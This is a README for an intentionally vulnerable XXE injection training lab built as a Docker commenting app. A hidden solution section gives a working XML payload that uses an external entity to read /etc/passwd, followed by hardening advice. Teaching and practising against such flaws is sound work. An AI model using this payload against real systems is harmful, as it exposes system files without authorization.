# XXE Injection Lab

This is a standalone lab demonstrating the OWASP Top 10 category A4: XML External Entity (XXE) Injection. The lab simulates a commenting system that is vulnerable to XXE injection due to improper configuration of the XML parser.

## Vulnerability

The lab demonstrates XXE injection through:
1. A commenting system that accepts and processes XML input
2. An XML parser configured to allow external entity expansion
3. No input validation on the XML data

## Setup

1. Make sure you have Docker and Docker Compose installed
2. Clone the repository
3. Navigate to the lab directory
4. Run:
```bash
docker-compose up --build
```
5. Visit http://localhost:5010 in your browser

## Challenge

The goal is to exploit the XXE vulnerability to:
1. Read sensitive files from the system
2. Demonstrate the risks of improper XML parsing

## Solution

<details>
<summary>Click to reveal solution</summary>

1. Use BurpSuite to intercept the comment submission request
2. Modify the XML payload to include an external entity
3. Use the external entity to read system files

Example payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE comm [
<!ELEMENT comm (#PCDATA)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comm>
<text>&xxe;</text>
</comm>
```

A secure implementation would:
- Disable DTD processing
- Disable external entity resolution
- Validate and sanitize XML input
- Use secure XML parsing libraries
</details>
